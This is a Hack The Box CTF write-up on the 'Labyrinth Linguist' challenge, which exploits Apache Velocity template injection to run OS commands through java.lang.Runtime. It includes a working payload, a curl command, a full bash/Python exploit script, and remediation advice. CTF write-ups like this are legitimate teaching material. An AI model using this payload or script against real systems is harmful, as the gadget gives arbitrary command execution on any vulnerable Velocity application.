# Labyrinth Linguist – Hack The Box CTF Writeup

**Event:** [Hack The Box CTF Event 1434](https://ctf.hackthebox.com/event/1434)  
**Challenge Name:** Labyrinth Linguist  
**Category:** Web / Server-Side Template Injection (SSTI)  
**Difficulty:** Medium  
**Technique:** Apache Velocity SSTI → Java Runtime command execution  

---

## Scenario Overview

> *You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors. It is used for translating English to Voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that Voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.*

The scenario sets a dystopian mood: a translator device that converts English to Voxalith – but the device is vulnerable to a template injection attack. Instead of translating harmless sentences, we can inject malicious Apache Velocity code and force the server to execute operating system commands. The goal is to retrieve the flag (`/flag.txt`) and escape the maze.

---

## Reconnaissance

The target is a web application listening on a given IP and port. In the actual CTF, the instance was reachable at:

```
http://154.57.164.73:31166/
```

Visiting the URL (or sending a `GET` request) presents a simple input form:

- A text area labelled “English phrase”
- A submit button labelled “Translate to Voxalith”

The application accepts a POST request to the root endpoint (`/`) with a parameter `text`. The server then processes the input and returns a translation – but under the hood it uses **Apache Velocity** as a template engine.

### Identifying the SSTI

Submitting a benign English phrase like `"Hello"` returns something like:

```
Voxalith translation: [some placeholder or transformed text]
```

However, submitting a Velocity template expression such as `#set($x=2+2) $x` did not behave like a normal translator – instead the expression was evaluated. This hinted at a **Server-Side Template Injection (SSTI)** vulnerability in the Velocity templating engine.

Velocity is a Java-based template engine that allows directives like `#set`, `#if`, `#foreach`, and direct method calls on Java objects. If user input is concatenated directly into a Velocity template without proper sanitisation, an attacker can execute arbitrary Java code on the server.

---

## Vulnerability Deep Dive

### Apache Velocity SSTI

Velocity templates are processed by the `VelocityEngine`. A typical vulnerable code pattern might look like:

```java
VelocityContext context = new VelocityContext();
StringWriter writer = new StringWriter();
String templateString = "Voxalith: " + userInput;   // UNSAFE!
Velocity.evaluate(context, writer, "LOG", templateString);
```

Because `userInput` is embedded verbatim, an attacker can inject directives. For example:

```
#set($x="Hello") $x
```

becomes part of the template and is executed.

### The PoC Payload

The proof-of-concept payload used in the exploit script is:

```velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())
#set($p=$rt.exec('cat /flag.txt'))
#set($sc=$x.class.forName('java.util.Scanner')
    .getConstructor($x.class.forName('java.io.InputStream'))
    .newInstance($p.getInputStream())
    .useDelimiter('\\A'))
$sc.next()
```

**Step-by-step breakdown:**

1. `#set($x='')` – creates an empty string variable. In Velocity, `$x.class` gives access to the `String` class (since `$x` is a string).
2. `$x.class.forName('java.lang.Runtime')` – loads the `Runtime` class.
3. `.getRuntime()` – obtains the static `Runtime` instance.
4. `$rt.exec('cat /flag.txt')` – executes the command and returns a `Process` object.
5. Next, a `Scanner` is instantiated using `$x.class.forName('java.util.Scanner')`. The constructor is retrieved for the signature that accepts an `InputStream`.
6. `newInstance($p.getInputStream())` – reads the standard output of the spawned process.
7. `.useDelimiter('\\A')` – sets the delimiter to the beginning of the input, effectively reading the entire output as one token.
8. `$sc.next()` – prints the entire flag.

When the server evaluates this template, the command `cat /flag.txt` is executed and its output is returned in the HTTP response.

---

## Exploitation – Manual Steps

Although the provided PoC script automates everything, here is how you would manually exploit the vulnerability:

1. **Intercept the POST request** (using Burp Suite or `curl`).  
   The request looks like:

   ```
   POST / HTTP/1.1
   Host: 154.57.164.73:31166
   Content-Type: application/x-www-form-urlencoded
   Content-Length: ...

   text=Hello+world
   ```

2. **Replace the `text` parameter** with the Velocity payload. Because the payload contains special characters, it must be URL-encoded. For instance:

   ```
   text=%23set(%24x%3D%27%27)%0A%23set(%24rt%3D%24x.class.forName(%27java.lang.Runtime%27).getRuntime())%0A%23set(%24p%3D%24rt.exec(%27cat%20%2Fflag.txt%27))%0A%23set(%24sc%3D%24x.class.forName(%27java.util.Scanner%27).getConstructor(%24x.class.forName(%27java.io.InputStream%27)).newInstance(%24p.getInputStream()).useDelimiter(%27%5C%5CA%27))%0A%24sc.next()
   ```

3. **Send the request** – the response will contain the flag instead of a normal translation.

Example using `curl`:

```bash
curl -X POST http://154.57.164.73:31166/ \
  --data-urlencode 'text=#set($x="")#set($rt=$x.class.forName("java.lang.Runtime").getRuntime())#set($p=$rt.exec("cat /flag.txt"))#set($sc=$x.class.forName("java.util.Scanner").getConstructor($x.class.forName("java.io.InputStream")).newInstance($p.getInputStream()).useDelimiter("\\A"))$sc.next()'
```

The flag appears in the response body.

---

## Provided PoC Script Analysis

The exploit script `labyrinth_linguist_poc.sh` is a bash wrapper that calls a Python one-liner. Key features:

- **Flexible argument parsing** – accepts either a full URL or separate host/port.
- **Timeout and verbose options** – useful for debugging.
- **JSON output** – for integration with other tools.
- **Python POST request** – constructs the Velocity payload, sends it, and extracts the flag using regex `HTB\{[^}]+\}`.

When executed correctly, the output is:

```
[*] Target: http://154.57.164.73:31166/
[*] Submitting Velocity SSTI payload...
[+] Flag extracted successfully.
HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_37dac9d310a5dfc5085b833cafbd93b1}
```

**Exit codes** are implemented for automation:
- `0` – flag found
- `1` – generic failure
- `2` – invalid arguments
- `3` – connectivity error
- `4` – flag not found

---

## Flag

The captured flag is:

```
HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_37dac9d310a5dfc5085b833cafbd93b1}
```
---
## Proof of Concept
```bash
#!/usr/bin/env bash
set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - Labyrinth Linguist
# Type: Apache Velocity SSTI -> Java Runtime command execution
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly DEFAULT_TIMEOUT=20

BASE_URL=""
HOST=""
PORT=""
TIMEOUT="${DEFAULT_TIMEOUT}"
JSON_OUTPUT=0
VERBOSE=0

usage() {
  cat <<EOF
Usage:
  ${SCRIPT_NAME} <base_url>
  ${SCRIPT_NAME} <host> <port>
  ${SCRIPT_NAME} --base-url <url> [options]
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --base-url <url>      Target base URL (example: http://154.57.164.76:30854/)
  --host <host>         Target host/IP
  --port <port>         Target port
  --timeout <seconds>   Request timeout in seconds (default: ${DEFAULT_TIMEOUT})
  --json                Print result as JSON
  --verbose             Enable verbose debug output
  -h, --help            Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity/request failure
  4  Flag not found in response
EOF
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_ok() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[+] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

parse_args() {
  local positional=()
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --base-url)
        BASE_URL="${2:-}"
        shift 2
        ;;
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${BASE_URL}" ]]; then
    if [[ ${#positional[@]} -eq 1 ]]; then
      BASE_URL="${positional[0]}"
    elif [[ ${#positional[@]} -ge 2 ]]; then
      HOST="${positional[0]}"
      PORT="${positional[1]}"
    fi
  fi

  if [[ -z "${BASE_URL}" ]]; then
    if [[ -n "${HOST}" && -n "${PORT}" ]]; then
      BASE_URL="http://${HOST}:${PORT}/"
    fi
  fi

  if [[ -z "${BASE_URL}" ]]; then
    log_error "Provide either base URL or host+port."
    usage >&2
    exit 2
  fi
}

main() {
  parse_args "$@"

  log_info "Target: ${BASE_URL}"
  log_info "Submitting Velocity SSTI payload..."

  local result
  if ! result="$(python3 - "$BASE_URL" "$TIMEOUT" "$VERBOSE" <<'PY'
import re
import sys
import requests

base = sys.argv[1].rstrip("/") + "/"
timeout = float(sys.argv[2])
verbose = sys.argv[3] == "1"

payload = (
    "#set($x='')"
    "#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())"
    "#set($p=$rt.exec('cat /flag.txt'))"
    "#set($sc=$x.class.forName('java.util.Scanner')"
    ".getConstructor($x.class.forName('java.io.InputStream'))"
    ".newInstance($p.getInputStream())"
    ".useDelimiter('\\\\A'))"
    "$sc.next()"
)

try:
    response = requests.post(base, data={"text": payload}, timeout=timeout)
    response.raise_for_status()
except requests.RequestException as exc:
    print(f"ERR_REQUEST:{exc}")
    raise SystemExit(3)

if verbose:
    print(f"DBG_STATUS:{response.status_code}")
    print(f"DBG_URL:{response.url}")

flag = re.search(r"HTB\{[^}]+\}", response.text)
if not flag:
    print("ERR_NOFLAG:Flag not found in response")
    raise SystemExit(4)

print(f"OK_FLAG:{flag.group(0)}")
PY
  )"; then
    case "$?" in
      3) log_error "Connectivity/request failure."; exit 3 ;;
      4) log_error "Flag not found in response."; exit 4 ;;
      *) log_error "Unexpected runtime failure."; exit 1 ;;
    esac
  fi

  log_debug "Exploit output: ${result}"
  local flag
  flag="$(printf '%s\n' "${result}" | sed -n 's/^OK_FLAG://p' | tail -n 1)"
  if [[ -z "${flag}" ]]; then
    log_error "No flag extracted from output."
    exit 4
  fi

  if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
    printf '{"target":"%s","flag":"%s"}\n' "${BASE_URL}" "${flag}"
  else
    log_ok "Flag extracted successfully."
    printf '%s\n' "${flag}"
  fi
}

main "$@"

```
---

## Remediation Advice (For the challenge creators / defenders)

To fix this vulnerability, the application should **never** embed user input directly into a template. Instead:

- Use a safe template engine or properly sandboxed expression language.
- If dynamic translation is required, pre-define safe variables and use a context object.
- Disable dangerous Velocity directives (`#set`, `#evaluate`, etc.) via a custom `SecureUberspector`.
- Validate input against a whitelist of allowed characters (e.g., only letters and spaces for natural language).

---

## Conclusion

Labyrinth Linguist was a clean demonstration of Apache Velocity SSTI leading to remote command execution. By injecting a crafted payload, we bypassed the “translation” feature and executed `cat /flag.txt` on the server. The challenge’s lore – a translator device corrupted by KORP – cleverly disguised a real-world web vulnerability. This writeup shows how reverse-engineering the device (i.e., understanding the template engine) allowed us to “make contact” (execute commands) and claim our escape.

*Happy hacking – and watch out for mutant exterminators!*
<img width="2560" height="1440" alt="image" src="https://github.com/user-attachments/assets/b1f77bd6-c463-4087-9c47-774aca7e1c4a" />
